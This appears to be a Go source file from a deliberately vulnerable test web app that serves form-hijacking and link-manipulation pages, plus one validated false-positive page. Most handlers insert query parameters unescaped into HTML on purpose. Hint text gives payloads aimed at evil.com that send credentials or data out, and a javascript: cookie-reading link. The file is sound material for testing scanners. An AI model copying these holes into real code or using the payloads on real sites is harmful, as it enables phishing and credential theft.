// vulns/formhijack/handlers.go
package formhijack

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/subzerodev/hive/handlers"
)

func init() {
	handlers.Register(func() {
		// Form Action Hijacking
		handlers.Handle("/vulns/formhijack/action", formAction)
		handlers.Handle("/vulns/formhijack/hidden", hiddenField)
		handlers.Handle("/vulns/formhijack/formaction-attr", formactionAttr)

		// Link Manipulation
		handlers.Handle("/vulns/formhijack/link", linkManip)
		handlers.Handle("/vulns/formhijack/base-tag", baseTag)

		// False positives
		handlers.Handle("/vulns/formhijack/fp/validated", fpValidated)
	})
}

func formAction(w http.ResponseWriter, r *http.Request) {
	action := r.URL.Query().Get("action")
	if action == "" {
		action = "/vulns/formhijack/submit"
	}

	w.Header().Set("Content-Type", "text/html")

	// VULNERABLE: User-controlled form action
	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
<title>Form Action Hijacking</title>
<link rel="stylesheet" href="/static/css/hive.css">
</head>
<body>
<div class="container">
<h1>Form Action Hijacking</h1>
<p>The form action is controlled by a URL parameter.</p>

<form method="POST" action="%s">
    <input name="username" placeholder="Username"><br><br>
    <input type="password" name="password" placeholder="Password"><br><br>
    <input type="hidden" name="csrf_token" value="abc123">
    <button type="submit">Login</button>
</form>

<h3>Current Form Action:</h3>
<pre>%s</pre>

<h3>Hint:</h3>
<p><small>Try: ?action=https://evil.com/phish</small></p>
<p><small>Credentials will be sent to the attacker's server</small></p>
<p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
</div>
</body></html>`, action, action)
}

func hiddenField(w http.ResponseWriter, r *http.Request) {
	returnURL := r.URL.Query().Get("return")
	if returnURL == "" {
		returnURL = "/dashboard"
	}

	w.Header().Set("Content-Type", "text/html")

	// VULNERABLE: Hidden field with user-controlled value
	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
<title>Form Action Hijacking - Hidden Field</title>
<link rel="stylesheet" href="/static/css/hive.css">
</head>
<body>
<div class="container">
<h1>Form Action Hijacking - Hidden Field</h1>
<p>Hidden field contains a URL that could be manipulated.</p>

<form method="POST" action="/vulns/formhijack/process">
    <input name="email" placeholder="Email"><br><br>
    <input type="hidden" name="return_url" value="%s">
    <button type="submit">Subscribe</button>
</form>

<h3>Hidden Field Value:</h3>
<pre>&lt;input type="hidden" name="return_url" value="%s"&gt;</pre>

<h3>Hint:</h3>
<p><small>Try: ?return=https://evil.com/phish</small></p>
<p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
</div>
</body></html>`, returnURL, returnURL)
}

func formactionAttr(w http.ResponseWriter, r *http.Request) {
	submitURL := r.URL.Query().Get("submit")
	if submitURL == "" {
		submitURL = "/vulns/formhijack/process"
	}

	w.Header().Set("Content-Type", "text/html")

	// VULNERABLE: formaction attribute override
	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
<title>Form Action Hijacking - formaction</title>
<link rel="stylesheet" href="/static/css/hive.css">
</head>
<body>
<div class="container">
<h1>Form Action Hijacking - formaction Attribute</h1>
<p>Button's formaction attribute overrides form action.</p>

<form method="POST" action="/safe/endpoint">
    <input name="data" placeholder="Enter data"><br><br>
    <button type="submit">Normal Submit</button>
    <button type="submit" formaction="%s">Special Submit</button>
</form>

<h3>Formaction Attribute:</h3>
<pre>formaction="%s"</pre>

<h3>Hint:</h3>
<p><small>Try: ?submit=https://evil.com/steal</small></p>
<p><small>The "Special Submit" button sends data to attacker</small></p>
<p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
</div>
</body></html>`, submitURL, submitURL)
}

func linkManip(w http.ResponseWriter, r *http.Request) {
	href := r.URL.Query().Get("href")
	if href == "" {
		href = "/dashboard"
	}

	w.Header().Set("Content-Type", "text/html")

	// VULNERABLE: User-controlled link href
	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
<title>Link Manipulation</title>
<link rel="stylesheet" href="/static/css/hive.css">
</head>
<body>
<div class="container">
<h1>Link Manipulation</h1>
<p>The link destination is controlled by a URL parameter.</p>

<p>Click here to continue: <a href="%s">Continue to Dashboard</a></p>

<h3>Link Href:</h3>
<pre>%s</pre>

<h3>Hint:</h3>
<p><small>Try: ?href=https://evil.com/phish</small></p>
<p><small>Or: ?href=javascript:alert(document.cookie)</small></p>
<p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
</div>
</body></html>`, href, href)
}

func baseTag(w http.ResponseWriter, r *http.Request) {
	base := r.URL.Query().Get("base")
	if base == "" {
		base = "/"
	}

	w.Header().Set("Content-Type", "text/html")

	// VULNERABLE: User-controlled base tag
	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
<title>Link Manipulation - Base Tag</title>
<link rel="stylesheet" href="/static/css/hive.css">
<base href="%s">
</head>
<body>
<div class="container">
<h1>Link Manipulation - Base Tag</h1>
<p>The base tag affects all relative URLs on the page.</p>

<p>Relative links:</p>
<ul>
    <li><a href="dashboard">Dashboard</a></li>
    <li><a href="profile">Profile</a></li>
    <li><a href="settings">Settings</a></li>
</ul>

<h3>Base Tag:</h3>
<pre>&lt;base href="%s"&gt;</pre>

<h3>Hint:</h3>
<p><small>Try: ?base=https://evil.com/</small></p>
<p><small>All relative links will resolve to attacker's domain</small></p>
<p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
</div>
</body></html>`, base, base)
}

func fpValidated(w http.ResponseWriter, r *http.Request) {
	action := r.URL.Query().Get("action")
	if action == "" {
		action = "/process"
	}

	w.Header().Set("Content-Type", "text/html")

	// SAFE: Validate action is relative path only
	parsedURL, err := url.Parse(action)
	isValid := err == nil && parsedURL.Host == "" && !strings.HasPrefix(action, "//") && strings.HasPrefix(action, "/")

	safeAction := "/process"
	if isValid {
		safeAction = action
	}

	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
<title>Form Action - Safe</title>
<link rel="stylesheet" href="/static/css/hive.css">
</head>
<body>
<div class="container">
<h1>Form Action - Safe (Validated)</h1>

<form method="POST" action="%s">
    <input name="data" placeholder="Enter data"><br><br>
    <button type="submit">Submit</button>
</form>

<h3>Requested Action:</h3>
<pre>%s</pre>
<h3>Safe Action Used:</h3>
<pre>%s</pre>

<h3>Security:</h3>
<p><small>SAFE: Only relative paths starting with / are allowed</small></p>
<p><small>External URLs and protocol-relative URLs are rejected</small></p>
<p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
</div>
</body></html>`, safeAction, action, safeAction)
}
